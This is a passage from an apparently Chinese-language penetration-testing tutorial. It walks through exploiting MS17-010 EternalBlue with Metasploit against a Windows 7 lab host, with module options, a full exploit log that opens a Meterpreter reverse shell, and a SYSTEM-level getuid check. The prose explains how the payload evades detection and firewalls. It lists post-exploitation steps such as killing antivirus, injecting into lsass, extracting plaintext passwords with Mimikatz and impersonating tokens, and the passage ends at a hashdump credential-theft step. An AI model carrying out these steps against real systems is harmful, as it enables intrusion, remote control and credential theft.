&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/x64/meterpreter/reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; show options
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Module options &lt;span class="o"&gt;(&lt;/span&gt;exploit/windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Name Current Setting Required Description
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ---- --------------- -------- -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; RHOSTS 10.0.0.17 yes The target host&lt;span class="o"&gt;(&lt;/span&gt;s&lt;span class="o"&gt;)&lt;/span&gt;, see https:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; //docs.metasploit.com/docs/usi
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ng-metasploit/basics/using-met
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; asploit.html
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; RPORT &lt;span class="m"&gt;445&lt;/span&gt; yes The target port &lt;span class="o"&gt;(&lt;/span&gt;TCP&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; SMBDomain no &lt;span class="o"&gt;(&lt;/span&gt;Optional&lt;span class="o"&gt;)&lt;/span&gt; The Windows domain
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; to use &lt;span class="k"&gt;for&lt;/span&gt; authentication. Onl
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; y affects Windows Server &lt;span class="m"&gt;2008&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; R2, Windows 7, Windows Embedde
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; d Standard &lt;span class="m"&gt;7&lt;/span&gt; target machines.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; SMBPass no &lt;span class="o"&gt;(&lt;/span&gt;Optional&lt;span class="o"&gt;)&lt;/span&gt; The password &lt;span class="k"&gt;for&lt;/span&gt; th
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; e specified username
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; SMBUser no &lt;span class="o"&gt;(&lt;/span&gt;Optional&lt;span class="o"&gt;)&lt;/span&gt; The username to aut
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; henticate as
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; VERIFY_ARCH &lt;span class="nb"&gt;true&lt;/span&gt; yes Check &lt;span class="k"&gt;if&lt;/span&gt; remote architecture m
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; atches exploit Target. Only af
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; fects Windows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2,
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Windows 7, Windows Embedded St
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; andard &lt;span class="m"&gt;7&lt;/span&gt; target machines.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; VERIFY_TARGET &lt;span class="nb"&gt;true&lt;/span&gt; yes Check &lt;span class="k"&gt;if&lt;/span&gt; remote OS matches exp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; loit Target. Only affects Wind
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ows Server &lt;span class="m"&gt;2008&lt;/span&gt; R2, Windows 7,
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Windows Embedded Standard &lt;span class="m"&gt;7&lt;/span&gt; t
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; arget machines.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Payload options &lt;span class="o"&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_tcp&lt;span class="o"&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Name Current Setting Required Description
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ---- --------------- -------- -----------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; EXITFUNC thread yes Exit technique &lt;span class="o"&gt;(&lt;/span&gt;Accepted: &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;, seh,
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; thread, process, none&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; LHOST 10.0.0.223 yes The listen address &lt;span class="o"&gt;(&lt;/span&gt;an interface ma
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; y be specified&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; LPORT &lt;span class="m"&gt;4444&lt;/span&gt; yes The listen port
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Exploit target:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Id Name
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -- ----
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;0&lt;/span&gt; Automatic Target
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;View the full module info with the info, or info -d command.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;PS：漏洞利用（Exploit）只是打开大门的“钥匙”，载荷（Payload）是进门之后要执行的任务。Metasploit 将默认Payload设置为&lt;code&gt;windows/x64/meterpreter/reverse_tcp&lt;/code&gt;。其中&lt;code&gt;windows/x64&lt;/code&gt;指明靶机系统是64位 windows 系统；&lt;code&gt;meterpreter&lt;/code&gt;是 Metasploit 的“王牌”载荷，运行在内存中，不写入硬盘（难以被察觉），且提供了极其丰富的内置命令（如 &lt;code&gt;hashdump&lt;/code&gt;, &lt;code&gt;screenshot&lt;/code&gt;, &lt;code&gt;webcam_snap&lt;/code&gt;），远比普通的 CMD 命令行强大；&lt;code&gt;reverse_tcp&lt;/code&gt;指明使用反向TCP连接，用于绕过防火墙，同时确保在复杂的网络环境下，攻击载荷能稳定地传输和通信，不会轻易断开连接。&lt;/p&gt;
&lt;p&gt;PS：设置反向连接后，需要指定&lt;code&gt;lhost&lt;/code&gt;参数，以指定靶机出发漏洞后能够成功连接回攻击机&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4444
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Host is likely VULNERABLE to MS17-010! - Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterprise &lt;span class="m"&gt;7600&lt;/span&gt; x64 &lt;span class="o"&gt;(&lt;/span&gt;64-bit&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Scanned &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; hosts &lt;span class="o"&gt;(&lt;/span&gt;100% &lt;span class="nb"&gt;complete&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - The target is vulnerable.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Connecting to target &lt;span class="k"&gt;for&lt;/span&gt; exploitation.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Connection established &lt;span class="k"&gt;for&lt;/span&gt; exploitation.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Target OS selected valid &lt;span class="k"&gt;for&lt;/span&gt; OS indicated by SMB reply
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - CORE raw buffer dump &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;25&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - 0x00000000 &lt;span class="m"&gt;57&lt;/span&gt; &lt;span class="m"&gt;69&lt;/span&gt; 6e &lt;span class="m"&gt;64&lt;/span&gt; 6f &lt;span class="m"&gt;77&lt;/span&gt; &lt;span class="m"&gt;73&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;37&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;45&lt;/span&gt; 6e &lt;span class="m"&gt;74&lt;/span&gt; &lt;span class="m"&gt;65&lt;/span&gt; &lt;span class="m"&gt;72&lt;/span&gt; &lt;span class="m"&gt;70&lt;/span&gt; Windows &lt;span class="m"&gt;7&lt;/span&gt; Enterp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - 0x00000010 &lt;span class="m"&gt;72&lt;/span&gt; &lt;span class="m"&gt;69&lt;/span&gt; &lt;span class="m"&gt;73&lt;/span&gt; &lt;span class="m"&gt;65&lt;/span&gt; &lt;span class="m"&gt;20&lt;/span&gt; &lt;span class="m"&gt;37&lt;/span&gt; &lt;span class="m"&gt;36&lt;/span&gt; &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;30&lt;/span&gt; rise &lt;span class="m"&gt;7600&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Target arch selected valid &lt;span class="k"&gt;for&lt;/span&gt; arch indicated by DCE/RPC reply
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Trying exploit with &lt;span class="m"&gt;12&lt;/span&gt; Groom Allocations.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending all but last fragment of exploit packet
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Starting non-paged pool grooming
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending SMBv2 buffers
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending final SMBv2 buffers.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending last fragment of exploit packet!
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Receiving response from exploit packet
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - ETERNALBLUE overwrite completed successfully &lt;span class="o"&gt;(&lt;/span&gt;0xC000000D&lt;span class="o"&gt;)&lt;/span&gt;!
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Sending egg to corrupted connection.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - Triggering free of corrupted buffer.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;203846&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4444 -&amp;gt; 10.0.0.17:49161&lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 05:39:27 +0000
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - &lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - &lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-WIN-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17:445 - &lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;-&lt;span class="o"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;PS：当前权限——&lt;code&gt;NT AUTHORITY\SYSTEM&lt;/code&gt; 权限（通常简称为 &lt;strong&gt;System 权限&lt;/strong&gt;）是 Windows 操作系统中的最高权限。在 Windows 安全模型中，&lt;code&gt;SYSTEM&lt;/code&gt; 账户（也称为本地系统账户）是操作系统内核及其核心服务运行的身份。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;它比管理员（Administrator）更高级&lt;/strong&gt;：Administrator 仍然受用户帐户控制（UAC）的限制，而 SYSTEM 账户不受任何限制。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限范围&lt;/strong&gt;：它拥有对本地计算机上&lt;strong&gt;所有资源&lt;/strong&gt;（文件、注册表、进程、硬件）的完整访问权限。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;现在，攻击机可以进行以下行为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;读取所有用户的文件&lt;/strong&gt;：Kali可以进入 &lt;code&gt;C:\Users\&lt;/code&gt; 下任何一个文件夹（如 Administrator 或其他普通用户），读取他们的桌面、文档和隐私文件。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;控制所有进程&lt;/strong&gt;：Kali可以杀死防火墙进程、杀毒软件进程，或者将你的恶意程序注入到任何系统进程（如 &lt;code&gt;lsass.exe&lt;/code&gt;）中。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;操作注册表&lt;/strong&gt;：Kali可以修改系统的核心配置，甚至破坏系统引导。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;获取明文密码&lt;/strong&gt;：只有在 SYSTEM 权限下，Kali才能使用 &lt;code&gt;load kiwi&lt;/code&gt; (Mimikatz) 从内存中提取出其他已登录用户的明文密码。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限降级（伪装）&lt;/strong&gt;：Kali可以随意切换到任何一个普通用户的身份（通过 &lt;code&gt;impersonate_token&lt;/code&gt;），看看他们在电脑上留下了什么。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="典型的后渗透攻击行为"&gt;典型的“后渗透”攻击行为
&lt;/h3&gt;&lt;h4 id="一凭据窃取"&gt;一、凭据窃取
&lt;/h4&gt;&lt;h5 id="1-导出哈希值hashdump"&gt;1. 导出哈希值（Hashdump）
&lt;/h5&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; hashdump
